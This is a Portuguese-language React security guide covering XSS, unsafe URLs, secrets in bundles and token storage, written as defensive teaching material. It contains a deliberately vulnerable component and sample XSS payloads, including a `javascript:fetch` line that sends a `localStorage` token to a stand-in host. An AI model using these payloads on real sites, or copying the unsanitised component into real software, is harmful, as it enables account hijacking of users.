# React — segurança

Última revisão: 2026-11-03

Escopo: React 18 e 19 no navegador (SPA com Vite ou similar), JavaScript ou TypeScript. Next.js tem referência própria (`javascript-typescript-nextjs-security.md`). A segurança real fica no backend; o front reduz superfície de XSS e vazamento.

## Recomendações

- Texto em JSX é escapado. Mantenha dado externo como texto e evite caminhos que pulam o escape.
- `dangerouslySetInnerHTML` só com HTML sanitizado (ex.: DOMPurify) imediatamente antes do uso, nunca com string vinda direto da API ou da URL.
- URLs em `href`, `src`, `action` e `window.location`: valide o protocolo (`https:`, `http:`, `mailto:` conforme o caso) com `new URL()`. Não conte com o React para bloquear `javascript:`.
- Não use `eval`, `new Function`, nem `setTimeout` com string sobre dado externo.
- Acesso direto ao DOM (`ref.current.innerHTML`, `insertAdjacentHTML`, bibliotecas jQuery) volta a ser XSS; aplique a mesma regra de sanitização.
- Segredos: tudo no bundle é público. Variáveis com prefixo de exposição (ex.: `VITE_`) chegam ao navegador. Chave de API privada fica no backend.
- Token de sessão: prefira cookie `HttpOnly` definido pelo backend. Token em `localStorage` é legível por qualquer XSS.
- Autorização na UI (esconder botão, rota protegida no router) é conveniência. O backend precisa negar.
- `postMessage`: confira `event.origin` contra allowlist antes de usar `event.data`; ao enviar, passe a origem alvo, não `'*'`.
- Links externos com `target="_blank"`: `rel="noopener noreferrer"`.
- CSP no servidor que entrega o app; evite `unsafe-inline` e `unsafe-eval` quando o build permitir.
- Dependências: revise pacotes de componentes que injetam HTML (markdown, rich text, editor) e mantenha o lockfile.

## Vulnerabilidades comuns

- XSS por `dangerouslySetInnerHTML={{ __html: comentario }}`.
- XSS por `<a href={perfil.site}>` com `javascript:alert(1)`.
- Renderizador de markdown configurado para aceitar HTML bruto.
- Token roubado de `localStorage` por script injetado ou dependência comprometida.
- Chave de serviço de terceiros embutida no bundle.
- Open redirect: `window.location = params.get('next')`.
- Dados sensíveis deixados em estado global persistido (Redux persist) ou em logs do console.

## Implementação segura

```tsx
import DOMPurify from 'dompurify';

function safeHref(raw: string): string | undefined {
  try {
    const url = new URL(raw, window.location.origin);
    return ['https:', 'http:', 'mailto:'].includes(url.protocol) ? url.href : undefined;
  } catch {
    return undefined;
  }
}

export function Comment({ html, site }: { html: string; site: string }) {
  const clean = DOMPurify.sanitize(html);
  return (
    <article>
      <div dangerouslySetInnerHTML={{ __html: clean }} />
      <a href={safeHref(site)} target="_blank" rel="noopener noreferrer">site</a>
    </article>
  );
}
```

## Implementação inadequada e risco

```tsx
export function Comment({ html, site }: { html: string; site: string }) {
  return (
    <article>
      <div dangerouslySetInnerHTML={{ __html: html }} />
      <a href={site}>site</a>
    </article>
  );
}
```

Risco: um comentário com `<img src=x onerror=...>` roda script de todo leitor; um site `javascript:fetch('//x?c='+localStorage.token)` executa ao clicar. Com token em `localStorage`, isso vira sequestro de conta.

## Testes de segurança

- Testing Library: renderizar com payloads (`<img src=x onerror=...>`, `<svg onload=...>`) e afirmar que nenhum atributo `on*` sobra no DOM.
- `safeHref('javascript:alert(1)')` retorna `undefined`.
- Busca no bundle de produção por chaves e URLs internas que não deveriam estar lá.
- Rotas protegidas: chamar a API diretamente sem permissão e confirmar a recusa do backend.
- Ferramentas opcionais: `eslint-plugin-react` (regras `react/no-danger`, `react/jsx-no-target-blank`), `npm audit`, Semgrep.

## Fontes

- https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html
- https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html
- https://cheatsheetseries.owasp.org/cheatsheets/HTML5_Security_Cheat_Sheet.html
- https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html
- https://owasp.org/www-project-application-security-verification-standard/
- https://owasp.org/Top10/
- https://react.dev/reference/react-dom/components/common
- https://github.com/cure53/DOMPurify
